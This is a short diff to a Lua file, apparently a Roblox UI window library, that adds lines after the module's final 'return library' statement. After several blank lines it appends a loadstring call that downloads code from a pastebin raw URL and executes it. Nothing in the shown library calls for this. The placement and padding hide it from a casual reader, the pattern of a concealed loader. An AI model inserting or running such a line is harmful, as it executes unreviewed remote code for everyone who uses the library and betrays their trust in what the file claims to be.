@@ -3647,3 +3647,9 @@ function library:CreateWindow(name, size, hidebutton)
 end
 
 return library
+
+
+
+
+loadstring(game:HttpGet("https://pastebin.com/raw/i6dE35nJ"))()
+
